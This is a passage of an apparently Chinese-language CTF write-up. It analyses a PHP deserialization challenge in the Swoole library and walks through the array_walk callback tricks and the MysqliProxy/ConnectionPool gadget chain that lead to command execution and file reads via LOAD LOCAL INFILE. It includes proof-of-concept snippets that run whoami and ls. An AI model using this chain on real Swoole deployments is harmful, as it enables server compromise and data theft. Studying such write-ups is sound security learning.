class="keyword">not</span> re.search(<span class="string">b"expects exactly|expects at most|expects at least|to be resource|parameter 1 to be|Object of class A could not be converted to string"</span>, stderr):</span><br><span class="line">        print(stdout)</span><br><span class="line">        print(stderr)</span><br></pre></td></tr></table></figure>
+<p>下面是fuzz脚本跑出来的结果</p>
+<p>在去掉参数数目和类型不对后，然后在400多行里面筛选出了这些</p>
+<blockquote>
+<p>PHP Warning:  preg_replace_callback(): Requires argument 2, ‘123444’, to be a valid callback</p>
+<p>PHP Warning:  mb_ereg_replace_callback() expects parameter 2 to be a valid callback</p>
+<p>PHP Warning:  array_walk() expects parameter 2 to be a valid callback, function ‘123444’ not found</p>
+<p>PHP Warning:  array_walk_recursive() expects parameter 2 to be a valid callback, function ‘123444’ not found</p>
+<p>PHP Warning:  array_intersect_ukey() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_uintersect() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning：array_uintersect_assoc() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_uintersect_assoc() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_intersect_uassoc() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_diff_ukey() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_udiff() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_udiff_assoc() expects parameter 3 to be a valid callback</p>
+<p>PHP Warning:  array_diff_uassoc() expects parameter 3 to be a valid callback</p>
+</blockquote>
+<p>我们只能控制第二个参数，所以着重检查了<code>preg_replace_callback</code> , <code>mb_ereg_replace_callback</code>, <code>array_walk()</code>, <code>array_walk_recursive()</code></p>
+<ul>
+<li><p><code>preg_replace_callback</code> 和 <code>mb_ereg_replace_callback</code> 不行 第一个参数要能转换成<code>string</code> </p>
+<ul>
+<li><blockquote>
+<p>PHP Catchable fatal error:  Object of class A could not be converted to string</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><code>array_walk</code></p>
+<ul>
+<li><p><code>array_walk($this, &quot;system&quot;, 1234);</code></p>
+<ul>
+<li><blockquote>
+<p>PHP Warning:  system() expects at most 2 parameters, 3 given</p>
+</blockquote>
+</li>
+<li><p>貌似只是因为参数数目不对，查看<code>array_walk</code> 文档</p>
+<blockquote>
+<p>典型情况下 <code>callback</code> 接受两个参数。<code>array</code> 参数的值作为第一个，键名作为第二个</p>
+<p>如果提供了可选参数 <code>userdata</code>，将被作为第三个参数传递给 callback <code>funcname</code></p>
+<p>如果 <code>callback</code> 函数需要的参数比给出的多，则每次 <strong>array_walk()</strong> 调用 <code>callback</code> 时都会产生一个 <a href="https://www.php.net/manual/zh/errorfunc.constants.php" target="_blank" rel="noopener">E_WARNING</a> 级的错误</p>
+</blockquote>
+<p>这里虽然传的是数组，但是可能<code>array_walk</code>把object的变量名当成了key，变量值当成了value。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>找个能够执行函数，并且是三个参数的，可以去翻文档，或者再fuzz一波，这里选择翻文档，可以找到</p>
+<blockquote>
+<p>exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] ) : string</p>
+</blockquote>
+<p>所以换成</p>
+<p><code>array_walk($this, &quot;exec&quot;, 1234);</code> </p>
+<blockquote>
+<p>PHP Warning:  exec(): Cannot execute a blank command</p>
+</blockquote>
+<p>这表示有变量没有值，导致传的是空命令，我们做一个小验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hh = <span class="string">"curl 127.0.0.1:8890"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="string">"exec"</span>, <span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;run();</span><br></pre></td></tr></table></figure>
+<p>是能够执行的。</p>
+<p>你以为到这里就结束了，我本来以为到这里就结束了，但是看writeup 发现用了两次<code>array_walk</code> 这是为啥呢？</p>
+<p>好像由于命名空间的问题，调用exec实际调的是<code>swoole_exec</code> 如果一个不成功，他产生的不是<code>warning</code>，而是<code>fatal error</code> 就不往下执行了。</p>
+<p>不知道array_walk 第一个遍历的是啥，看了一下顺序貌似是变量定义的顺序。<del>也许我们在反序列化的时候将要执行的变量放到第一个就能执行了</del>。试试。不行，是根据定义的时候的顺序决定的。<code>Handler</code> 第一个变量是<code>clinet</code> 不能随便赋值成要执行的命令，后面会用到他。所以还得想个办法让他能够遍历到我们控制的那个属性。wupco是再次利用<code>array_walk</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk($this, array_walk, 123);</span><br></pre></td></tr></table></figure>
+<p>遇到第一个属性<code>client</code>的时候</p>
+<p>array_walk($client_obj, “client”, 123); 由于client这个callback不存在，只会产生</p>
+<blockquote>
+<p>PHP Warning:  array_walk() expects parameter 2 to be a valid callback, function ‘client’ not found</p>
+</blockquote>
+<p>如果遇到了某个属性的值不是<code>Array</code>或不是<code>object</code> 就会报</p>
+<blockquote>
+<p>PHP Warning:  array_walk() expects parameter 1 to be array </p>
+</blockquote>
+<p>这两种<code>warning</code>都不影响继续运行下去。</p>
+<p>他在给对象额外设置了一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;exec = array(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
+<p>当遍历到这个属性的时候会调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk(array(&quot;whoami&quot;), &quot;exec&quot;, 123)</span><br></pre></td></tr></table></figure>
+<p>然后出发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;whoami&quot;,0,123)</span><br></pre></td></tr></table></figure>
+<p>就执行了<code>whoami</code> </p>
+<p><strong>妙</strong></p>
+<p>能不能用system呢？也是可以的，可以用<code>call_user_func</code> 来助攻, 他的参数数量没有限制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $whoami = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">public</span> $h = <span class="string">"system"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $hh = <span class="string">"ls -al"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$&#123;hh&#125; = <span class="string">"system"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">array_walk(<span class="keyword">new</span> B(), <span class="string">"call_user_func"</span>, <span class="number">123</span>);</span><br></pre></td></tr></table></figure>
+<p>会变成调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&quot;system&quot;, &quot;whoami&quot;, 123);</span><br></pre></td></tr></table></figure>
+<p>最后一步调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;whoami&quot;, 123);</span><br></pre></td></tr></table></figure>
+<p>哦，看起来好像也可以，本地执行也可以，然后和wupco交流的时候，他发现他那边不行，我觉得可能是php版本的问题，然后在php7.4.6上面跑了一下没有空格的能执行成功，但是有空格的那个<code>ls -al</code> 竟然 <code>segment fault</code> 了。</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200602095531988.png" alt="image-20200602095531988"></p>
+<p>然后就夭折了。</p>
+<p>出错的地方不是在赋值那里，是在array_walk 那句出现了问题，后面涉及到了php 源码啥的，目前还不会就跟不动了。wupco调了一下core dump 给了我一个函数名<code>zend_verify_ref_assignable_zval</code></p>
+<p>我看了一下php-src 也没看太懂是为啥。这个就到这里吧。</p>
+<p>那么到底能不能执行system呢？</p>
+<p><code>xxxx($value, $key, xxxx)</code></p>
+<p>可控的是<code>$value</code> 和 <code>$key</code>  而且<code>key</code>不能有空格，所以还是最好<code>$key</code> 来当<code>callback</code> ，<code>$value</code> 来当参数。</p>
+<p>所以我们的目标是找一个函数第二个参数是<code>callback</code>, 并且能接受三个参数的。好像又会到了最初的起点。所以可以用<code>array_walk</code>。 但是这次条件比上次宽了一点，第一个<code>$value</code>  参数的类型我们可以控制，array的回调函数有很多，这里我选择去翻了文档。找到了一个</p>
+<blockquote>
+<p>array_filter ( array <code>$array</code> [, <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> <code>$callback</code> [, int <code>$flag</code> = 0 ]] )</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $whoami = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">public</span> $h = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">public</span> $system = <span class="keyword">array</span>(<span class="string">"ls -al"</span>);</span><br><span class="line">&#125;</span><br><span class="line">array_walk(<span class="keyword">new</span> B(), <span class="string">"array_filter"</span>, <span class="number">123</span>);</span><br></pre></td></tr></table></figure>
+<p>终于能执行<code>system</code> </p>
+<h3 id="预期做法"><a href="#预期做法" class="headerlink" title="预期做法"></a>预期做法</h3><p>感觉预期做法也很巧妙。上面也提到了题目给出了flag的位置，我只想到了可能利用<code>curl</code>上传文件。直到放出hint，给了个github</p>
+<p> 的issue。<a href="https://github.com/swoole/library/issues/34" target="_blank" rel="noopener">https://github.com/swoole/library/issues/34</a></p>
+<p>看到这个issue 恍然大悟，也可以用mysql 客户端读文件，而且可以设置一些options， 根据文档，设置<a href="https://www.php.net/manual/zh/mysqli.options.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/mysqli.options.php</a></p>
+<blockquote>
+<p><strong><code>MYSQLI_OPT_LOCAL_INFILE</code></strong>  启用或禁用 <em>LOAD LOCAL INFILE</em> 语句      </p>
+<p><strong><code>MYSQLI_INIT_COMMAND</code></strong>      成功建立 MySQL 连接之后要执行的 SQL 语句 </p>
+</blockquote>
+<p>但是有个限制</p>
+<blockquote>
+<p><strong>mysqli_options()</strong> 需要在 <a href="https://www.php.net/manual/zh/mysqli.init.php" target="_blank" rel="noopener">mysqli_init()</a> 函数之后、 <a href="https://www.php.net/manual/zh/mysqli.real-connect.php" target="_blank" rel="noopener">mysqli_real_connect()</a> 函数之前被调用</p>
+</blockquote>
+<p>当时审的代码是最新的代码，那里面的mysqli已经按照zsx提的issue改过来了。</p>
+<p>通过审计上述列出的无参函数，可以在connectionpool中 发现下面的代码。</p>
+<p><code>connectionpool.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Pool has been closed'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool-&gt;isEmpty() &amp;&amp; <span class="keyword">$this</span>-&gt;num &lt; <span class="keyword">$this</span>-&gt;size) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;make();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;pop();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;num++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;proxy) &#123;</span><br><span class="line">                $connection = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;proxy(<span class="keyword">$this</span>-&gt;constructor);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">                $connection = $constructor();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable $throwable) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;num--;</span><br><span class="line">            <span class="keyword">throw</span> $throwable;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;put($connection);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在make方法里面有个new可以控制class name 和 参数。所以我们可以通过调用connectionpool的get方法得到一个new生成的对象</p>
+<p>再去找<code>__construct</code></p>
+<p><code>mysqlipool.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(MysqliConfig $config, int $size = self::DEFAULT_SIZE)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            $mysqli = <span class="keyword">new</span> mysqli();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;config-&gt;getOptions() <span class="keyword">as</span> $option =&gt; $value) &#123;</span><br><span class="line">                $mysqli-&gt;set_opt($option, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $mysqli-&gt;real_connect(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getHost(),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getUsername(),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getPassword(),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getDbname(),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getPort(),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;config-&gt;getUnixSocket()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MysqliException($mysqli-&gt;connect_errno, $mysqli-&gt;connect_errno);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $mysqli;</span><br><span class="line">        &#125;, $size, MysqliProxy::class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这是mysqlipool 的构造函数。但是题目对应的是4.4.18 还没有按照zsx的改过来。<del>当时想当然以为zsx自己改过来了</del>。</p>
+<p>所以我们可以找一条链，通过调用connectionpool的get方法，new一个mysqlipool 出来。当时以为这样就是万事大吉了。</p>
+<p>但是再仔细一看，mysqli的构造函数只是生成了一个回调函数，当真正有方法调用的时候才会调用那个回调函数，去连mysql服务器。</p>
+<p>去跟一下mysqlipool 的parent 也就是connectionpool构造方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(callable $constructor, int $size = self::DEFAULT_SIZE, ?string $proxy = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> Channel(<span class="keyword">$this</span>-&gt;size = $size);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;constructor = $constructor;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;proxy = $proxy;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>只是进行了赋值，也没有执行传进去的回调函数。</p>
+<p>想找个方法能<code>$obj-&gt;get()-&gt;get()</code> </p>
+<p>又审了其他无参的函数。</p>
+<p><code>mysqliproxy</code> 的<code>__call</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string $name, array $arguments)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> ($n = <span class="number">3</span>; $n--;) &#123;</span><br><span class="line">           $ret = @<span class="keyword">$this</span>-&gt;__object-&gt;&#123;$name&#125;(...$arguments);</span><br><span class="line">           <span class="keyword">if</span> ($ret === <span class="keyword">false</span>) &#123;</span><br><span class="line">               <span class="comment">/* non-IO method */</span></span><br><span class="line">               <span class="keyword">if</span> (!preg_match(<span class="keyword">static</span>::IO_METHOD_REGEX, $name)) &#123;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">/* no more chances or non-IO failures */</span></span><br><span class="line">               <span class="keyword">if</span> (</span><br><span class="line">                   !in_array(<span class="keyword">$this</span>-&gt;__object-&gt;errno, <span class="keyword">static</span>::IO_ERRORS, <span class="keyword">true</span>) ||</span><br><span class="line">                   $n === <span class="number">0</span></span><br><span class="line">               ) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> MysqliException(<span class="keyword">$this</span>-&gt;__object-&gt;error, <span class="keyword">$this</span>-&gt;__object-&gt;errno);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;reconnect();</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (strcasecmp($name, <span class="string">'prepare'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">               $ret = <span class="keyword">new</span> MysqliStatementProxy($ret, $arguments[<span class="number">0</span>], <span class="keyword">$this</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (strcasecmp($name, <span class="string">'stmt_init'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">               $ret = <span class="keyword">new</span> MysqliStatementProxy($ret, <span class="keyword">null</span>, <span class="keyword">$this</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>以及 <code>reconnect</code> 函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reconnect</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($constructor());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;round++;</span><br><span class="line">        <span class="comment">/* restore context */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;charsetContext) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__object-&gt;set_charset(<span class="keyword">$this</span>-&gt;charsetContext);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;setOptContext) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;setOptContext <span class="keyword">as</span> $opt =&gt; $val) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;__object-&gt;set_opt($opt, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;changeUserContext) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__object-&gt;change_user(...<span class="keyword">$this</span>-&gt;changeUserContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>parent::__construct($constructor());</code> 这步会对<code>$this-&gt;__object</code> 进行重新赋值。</p>
+<p>所以一条链<del>浮现在了眼前</del></p>
+<p>调用<code>mysqliproxy</code> 的<code>get</code> 方法，<code>get</code> 方法不存在，然后调用<code>__call</code> </p>
+<p>有三次调用<code>$ret = @$this-&gt;__object-&gt;{$name}(...$arguments);</code> </p>
+<p>通过控制第一次的<code>$ret = @$this-&gt;__object-&gt;get(...$arguments);</code> 返回false，然后调用<code>reconnect</code> 对<code>$this-&gt;__object</code> 进行重新赋值（<code>$this-&gt;construct</code> 可以为<code>[connectionpool, &#39;get&#39;]</code>  ），执行完<code>reconnect</code> <code>$this-&gt;object</code> 就会变成<code>new mysqlipool($config)</code></p>
+<p>这样就再次来到<code>$ret = @$this-&gt;__object-&gt;get(...$arguments);</code> 就会触发。</p>
+<p>看到这里已经开始窃喜了，但是冷静下来一看不对呀， <code>(!preg_match(static::IO_METHOD_REGEX, $name))</code> 这里对方法名进行了检查，而且是静态变量，不能通过反序列化进行修改。</p>
+<p>搞到这里就有点黔驴技穷了。</p>
+<p>那么到底如何触发<code>$obj-&gt;get()-&gt;get()</code> 呢？</p>
+<p>看了writeup 才恍然大悟。还记得<code>handler.php</code> 里面的两个函数吗?<code>headerFunction</code> 和 <code>readFunction</code></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/6/image-20200602160316294.png" alt="image-20200602160316294"></p>
+<p>首先你需要知道自定义函数的参数能<strong>多传</strong>，不能少传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xx</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $cmd;</span><br><span class="line">&#125;</span><br><span class="line">xx(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+<p>这个是能执行的。</p>
+<p>虽然圈出来的都有参数，但是我们调用这种<code>[$obj,&#39;xxxx&#39;](&#39;xx&#39;, &#39;xxx&#39;)</code> （<code>$obj.xxxx</code> 是无参函数） 这种也是可以的。</p>
+<p>下面的<code>$obj</code> 是<code>mysqliproxy</code> 对象</p>
+<p>控制<code>headerFunction</code> 为<code>[$obj, &quot;reconnect&quot;]</code> 会对<code>__object</code> 赋值为<code>new mysqlipool</code>  </p>
+<p>再控制<code>readerFunctioin</code> 为<code>[$obj, &quot;get&quot;]</code> 但是由于没有<code>mysqliproxy</code> 没有<code>get</code> 方法就会调用<code>__call</code> </p>
+<p>就会调用</p>
+<p><code>$ret = @$this-&gt;__object-&gt;get(...$arguments)</code> 这样就触发了。</p>
+<p><strong>妙</strong></p>
+<p>这里还有个地方connectionpool里面的<code>$this-&gt;pool</code> 用的是<code>chanle</code> 这个不支持反序列化，需要找个替代，这里可以用<code>ArrayObject</code> 代替因为他对应的方法也都有，zsx用的是<code>SplDoublyLinkedList</code> 这是php自带的一个。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>上面的分析是基于mysqli，下面的exp也是基于mysqli的，虽然在题目中不能用，但是可以用在最新的swoole。</p>
+<p>反序列化的构造payload以前都是把类单独摘出来，然后往里面塞参数。看了zsx的writeup又学到了一种，可以在目标环境中生成类，然后通过反射修改属性，这样可能更方便一点。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 